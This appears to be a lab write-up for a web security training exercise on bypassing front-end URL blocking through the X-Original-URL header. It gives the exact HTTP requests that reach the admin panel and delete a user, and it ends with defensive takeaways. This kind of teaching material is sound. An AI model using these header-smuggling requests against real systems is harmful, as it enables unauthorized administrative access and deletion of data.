# Lab: URL-Based Access Control Can Be Circumvented


## Objective



Access the admin panel and delete the user `carlos`.


The admin panel is located at:



```text

/admin

```



However, direct access to this path is blocked by a front-end system.



---



## Vulnerability



The application has a **URL-based access control bypass**.



The front-end blocks access to `/admin`, while the back-end supports the `X-Original-URL` HTTP header.



By using this header, we can make the back-end process a different URL from the one that the front-end sees.



---



## Steps to Solve



### 1. Identify the Protected Path



The admin panel is located at:



```text


/admin

```



A direct request is blocked:



```http

GET /admin HTTP/2

```



The front-end prevents access.



---



### 2. Bypass the Restriction



Send a request to `/` while specifying `/admin` in the `X-Original-URL` header:



```http

GET / HTTP/2

Host: YOUR-LAB-ID.web-security-academy.net

X-Original-URL: /admin

```



The front-end sees:



```text

/

```



while the back-end processes:



```text

/admin

```



This allows us to access the admin panel.



---



### 3. Find the Delete Endpoint



Inspect the admin panel and find the delete link for Carlos:



```html

<a href="/admin/delete?username=carlos">Delete</a>

```



Therefore, the target endpoint is:



```text

/admin/delete?username=carlos

```



---



### 4. Separate the Path and Query String



An important detail in this lab is that the path and query string must be placed separately.


Use:



```http

GET /?username=carlos HTTP/2

Host: YOUR-LAB-ID.web-security-academy.net

X-Original-URL: /admin/delete

```



Here:



```text

Real URL:

/?username=carlos

```



And:



```text

X-Original-URL:

/admin/delete

```



The back-end effectively processes:



```text

/admin/delete?username=carlos

```



---



### 5. Delete Carlos



The request reaches the protected delete endpoint and deletes:



```text

carlos

```



The lab is solved. ✅



---




## How the Bypass Works



```text

Normal Request

     ↓

GET /admin

     ↓

Front-end blocks it ❌

```



Using the header:



```text

GET /

X-Original-URL: /admin

     ↓

Front-end sees /

     ↓

Back-end processes /admin

     ↓

Admin Panel accessible ✅


```



For the delete action:



```text

GET /?username=carlos

X-Original-URL: /admin/delete

     ↓

Back-end processes

/admin/delete?username=carlos

     ↓

Carlos deleted ✅

```



---



## Why Does the Vulnerability Exist?



The application has inconsistent access control between the **front-end** and **back-end**.



The front-end blocks `/admin`, but the back-end trusts the `X-Original-URL` header and processes the path specified 
in it.



This creates an **access control bypass**.



---



## Important: Path vs Query String




The most important detail in this lab is understanding the difference between the **path** and the **query string**.



### Path



```text

/admin/delete

```



### Query String



```text

?username=carlos

```



They are combined to form:



```text

/admin/delete?username=carlos

```



In this lab, they are sent separately:



```http

GET /?username=carlos

X-Original-URL: /admin/delete

```




---



## Important Note



`X-Original-URL` is not inherently a vulnerability.



The vulnerability occurs when the application or infrastructure trusts this header in a way that allows users to 
bypass access controls.



---



## Attack Flow



```text

Protected /admin


      ↓

Direct access blocked

      ↓

X-Original-URL: /admin

      ↓

Access Admin Panel

      ↓

Find delete endpoint

      ↓

/admin/delete?username=carlos

      ↓
Separate path and query string

      ↓

Access protected endpoint

      ↓

Delete Carlos

```



---



## Key Takeaways



* Access control must be enforced consistently across all application layers.

* Never rely only on front-end URL restrictions.

* Be careful when trusting headers such as `X-Original-URL`.

* Always inspect how the front-end and back-end interpret URLs.

* Understand the difference between the URL path and query string.

* Access control must be enforced server-side.

* Security controls should not depend on user-controllable HTTP headers.



### Vulnerability Type



**URL-Based Access Control Bypass**



### Related Concepts



* Broken Access Control

* Access Control Bypass

* URL-Based Access Control

* `X-Original-URL`

* Front-end / Back-end Architecture

* HTTP Headers

* Query Strings

* Server-Side Authorization
